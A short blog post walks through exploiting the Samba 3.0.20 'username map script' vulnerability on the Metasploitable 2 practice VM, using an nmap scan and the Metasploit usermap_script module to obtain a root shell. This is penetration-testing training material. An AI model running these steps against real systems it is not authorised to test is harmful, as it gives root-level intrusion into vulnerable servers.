---
layout: post
title: Samba "Username map script" in Metasploitable 2
---

### Introduction

Welcome to yet another article on exploiting Metasploitable 2. This exploit is very much similar to my previous post as you shall see, we are using the same technique to discover a vulnerabiity. Most of this discovery lies in doing research on the internet about the version of a service being used, and finding out if there are any known exploits on that.

Metasploitable 2 is running on 172.20.10.8, so i did the scanning as usual to check the open ports and services running on the target machine.

```
nmap -sV -sS -A 172.20.10.8
```

![Scanning]({{site.url }}/imgs/metasploitable2/met2.png)
 
As we can see, the target is using Samba version 3.0.20, which allows an attacker to execute arbitrary commands, by specifying a username containg shell meta characters. 

![]({{site.url }}/imgs/metasploitable2/met3.png)

We are going to use the metasploit framework to run the exploit hence:

```
msfconsole
search samba 3.0.20
use exploit/multi/samba/usermap_script
```
![]({{site.url }}/imgs/metasploitable2/met4.png)

We set our target:

```
set RHOSTS 172.20.10.8
```
![]({{site.url }}/imgs/metasploitable2/met5.png)

and run the exploit

```
exploit
```
![]({{site.url }}/imgs/metasploitable2/met6.png)

This automatically gives us a root shell, where we can execute arbitrary commands and dig further in the target machine. This is a very simple exploit that depends on research and further reading to understand the vulnerability being manipulated. It is also important to use the metasploit framework at our disposal t the fullest, as it contains a lot of exploits for known vulnerabilities.

Knowing how to write your own exploits is also important, for situatios where you are conducting a real life penetration test and you discover a new vulnerability. I will also be looking into how to write simple exploits with Python, for practice sake.

But that's it for now!
